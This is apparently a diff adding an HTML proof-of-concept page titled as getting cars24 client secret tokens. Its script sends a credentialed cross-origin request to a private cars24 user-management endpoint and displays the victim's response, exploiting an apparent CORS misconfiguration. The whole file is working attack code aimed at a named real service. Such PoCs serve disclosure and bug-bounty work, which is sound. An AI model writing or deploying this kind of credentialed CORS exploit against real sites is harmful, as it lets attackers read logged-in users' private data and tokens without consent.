@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+<body>
+
+<div>
+<h1>Getting cars24 Client secret tokens and other informations!!!</h1>
+</div>
+
+<script>
+
+var invocation = new XMLHttpRequest();
+
+  invocation.onreadystatechange = function() {
+    if (invocation.readyState == XMLHttpRequest.DONE) {
+      alert(invocation.response);
+    }
+  }
+
+function cors(){
+  if(invocation) {
+    invocation.open('GET', "https://pvt-product.cars24.com/pp/ums/users/", true);
+    invocation.withCredentials = true;
+    invocation.send(); 
+  }
+}
+
+cors();
+  
+  
+</script>
+
+</body>
+</html>
